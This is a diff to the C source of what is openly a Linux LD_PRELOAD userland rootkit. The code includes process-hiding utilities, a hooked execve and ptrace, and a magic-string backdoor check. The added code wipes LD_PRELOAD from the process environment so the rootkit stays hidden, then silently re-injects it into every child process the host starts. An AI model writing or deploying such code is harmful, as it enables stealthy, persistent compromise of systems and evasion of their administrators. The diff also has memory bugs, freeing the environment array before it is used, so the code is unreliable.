@@ -26,6 +26,8 @@
 #include "utils/hide_procs.c"
 
 void *libc;
+extern char **environ;
+char *ld_path; 
 
 int owned(void)
 { 
@@ -67,11 +69,55 @@ __attribute__ ((constructor)) static void init(void)
 	#ifdef DEBUG
 	printf("[rk] loaded: \n");
 	#endif
-	char *path = strdup(LIBC); xor(path); 
-	libc = dlopen(path, RTLD_LAZY);
-	CLEAN(path); 
-}
 
+	char *libc_path = strdup(LIBC); xor(libc_path); 
+	libc = dlopen(libc_path, RTLD_LAZY);
+	
+	// using classic hiding method by haxelion 
+	static const char *ld_preload = "LD_PRELOAD"; 
+	int len = strlen(getenv(ld_preload)); 
+	ld_path = (char *) malloc(len+1); 
+	strcpy(ld_path, getenv(ld_preload)); 
+	int i, j;
+	// looking for LD_PRELOAD 
+	for (i=0; environ[i]; i++)
+	{ 
+		int x = 1;
+		for (j=0; ld_preload[j] != '\0' && environ[i][j] != '\0'; j++)
+	       	{
+		      if (ld_preload[j] != environ[i][j])
+		      { 
+			    x = 0; 
+			    break;
+		      }
+	      	}
+		if (x)
+		{ 
+			for (j=0; environ[i][j] != '\0'; j++)
+			{ 
+				environ[i][j] = '\0'; 
+			}
+			break;
+			free((void*)environ[i]);
+		}
+	}
+	for(j=i; environ[j]; j++)
+		environ[j] = environ[j+1]; 
+}
+/*
+char *getenv(const char *name)
+{ 
+	HOOK(getenv); 
+	#ifdef DEBUG
+	printf("[!] getenv hooked\n"); 
+	#endif 
+
+	if (owned()) return old_getenv(name);
+	if (strcmp(name, "LD_PRELOAD") == 0)
+		return NULL; 
+	return old_getenv(name);
+}
+*/
 int execve(const char *path, char *const argv[], char *const envp[]) 
 { 
 	HOOK(execve); 
@@ -81,6 +127,34 @@ int execve(const char *path, char *const argv[], char *const envp[])
 	#endif 
 
 	if (owned()) return old_execve(path, argv, envp);
+	
+	int i, j, x=-1;
+	for (i=0; envp[i]; i++)
+	{ 
+		// xor this string out later 
+		if (strstr(envp[i], "LD_PRELOAD"))
+			x = i;
+	}
+	if (x == -1)
+	{ 
+		x = i; 
+		i++;
+	} 
+	char **hidden_env = (char **) malloc((i+1)*sizeof(char *)); 
+	for (j=0; j<i; j++)
+	{
+		 if (j == x)
+		 { 
+			 hidden_env[j] = (char *) malloc(256); 
+			 strcpy(hidden_env[j], "LD_PRELOAD="); 
+			 strcat(hidden_env[j], ld_path); 
+		 }
+		 else
+			 hidden_env[j] = (char *) envp[j];
+	}
+	hidden_env[i] = NULL; 
+	free(hidden_env[x]); 
+	free(hidden_env); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
 	old___xstat(_STAT_VER, path, &filestat);
@@ -91,7 +165,7 @@ int execve(const char *path, char *const argv[], char *const envp[])
 		return -1; 
 	}
 	CLEAN(magic); 
-	return old_execve(path, argv, envp);
+	return old_execve(path, argv, hidden_env);
 } 
 
 long int ptrace(enum __ptrace_request request, ...)
